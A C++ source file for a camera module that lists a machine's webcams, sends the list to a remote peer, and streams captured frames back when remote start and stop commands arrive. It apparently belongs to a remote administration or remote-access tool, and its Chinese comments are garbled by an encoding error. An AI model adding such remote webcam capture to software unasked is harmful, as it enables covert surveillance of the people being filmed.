#include "Camera.h"

#define STRSAFE_NO_DEPRECATE

CCamera::CCamera() :
CEventHandler(CAMERA)
{
	m_bStop = FALSE;
	m_hWorkThread = NULL;
}


CCamera::~CCamera()
{
	//mmmp ,UnbindHandler, Send will Failed! in OnStop();
	//OnStop();
}

void CCamera::OnConnect()
{
	WCHAR szError[0x1000];
	list<CCameraGrab::DeviceInfo> &list = m_Grab.GetDeviceList();
	wstring sList;

	for (std::list<CCameraGrab::DeviceInfo>::iterator Device = list.begin(); Device != list.end(); Device++)
	{
		sList += Device->szName;
		sList += L"\t";
		for (map<DWORD,DWORD>::iterator Size = Device->VideoSize.begin(); Size != Device->VideoSize.end(); Size++)
		{
			WCHAR szVideoSize[128] = { 0 };
			wsprintfW(szVideoSize, L"%u x %u,", Size->first, Size->second);
			sList += szVideoSize;
		}
		sList += L"\n";
	}
	Send(CAMERA_DEVICELIST, (char*)sList.c_str(), sizeof(WCHAR)*(sList.length() + 1));
}

void CCamera::OnClose()
{
	OnStop();
	//һ��Ҫֹͣ��׽,�����̼߳������ͻ����.
}

void CCamera::OnStart(int idx,DWORD dwWidth,DWORD dwHeight)
{
	DWORD dwResponse[3] = { 0 };
	dwResponse[0] = m_Grab.GrabberInit(idx, dwWidth,dwHeight);
	if (dwResponse[0])
	{
		dwResponse[1] = dwWidth;
		dwResponse[2] = dwHeight;
	}
	Send(CAMERA_VIDEOSIZE, (char*)dwResponse, sizeof(dwResponse));
	//
	m_Grab.StopGrab();						//ֹͣ��׽

	//����δ�ͷŵ��߳���Դ.
	InterlockedExchange(&m_bStop, TRUE);	//ֹͣ����
	//�ر���һ��δ�ͷŵ���Դ.
	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread, INFINITE);		//�ȴ��߳��˳�
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}

	//ȡ��ֹͣ���.
	InterlockedExchange(&m_bStop, FALSE);
	if (TRUE == m_Grab.StartGrab())
	{
		//�����߳�����.
		m_hWorkThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, 0);
	}
}

void CCamera::WorkThread(CCamera*pThis)
{
	BOOL bStop = FALSE;

	while (!InterlockedExchange(&pThis->m_bStop, FALSE))
	{
		char*Buffer = NULL;
		DWORD dwLen = NULL;

		bStop = !pThis->m_Grab.GetFrame(&Buffer, &dwLen);
		if (!bStop)
			pThis->Send(CAMERA_FRAME, Buffer, dwLen);	//������,����free

		//�ɼ��ٶȺ������30fps/s,���ﲻ��������,
		//�����ӳټӶ��л�����ɷ���������ʵʱ��ʾ����,ͼ��Խ��,���ڴ����С,�ӳ�Խ��
		/*DWORD dwUsedTime = (GetTickCount() - dwLastTime);
		while ((GetTickCount() - dwLastTime) < (1000 / 30))
			Sleep(1);*/
	}
	InterlockedExchange(&pThis->m_bStop, TRUE);
}

void CCamera::OnStop()
{
	m_Grab.StopGrab();						//ֹͣ��׽
	InterlockedExchange(&m_bStop, TRUE);	//ֹͣ����

	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread,INFINITE);		//�ȴ��߳��˳�
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}
	//�ر����.
	m_Grab.GrabberTerm();
	Send(CAMERA_STOP_OK, 0, 0);
}

void CCamera::OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer)
{
	switch (Event)
	{
	case CAMERA_START:
		OnStart(((DWORD*)Buffer)[0], ((DWORD*)Buffer)[1], ((DWORD*)Buffer)[2]);
		break;
	case CAMERA_STOP:
		OnStop();
		break;
	case CAMERA_SCREENSHOT:
		Send(CAMERA_SCREENSHOT, 0, 0);
		break;
	default:
		break;
	}
}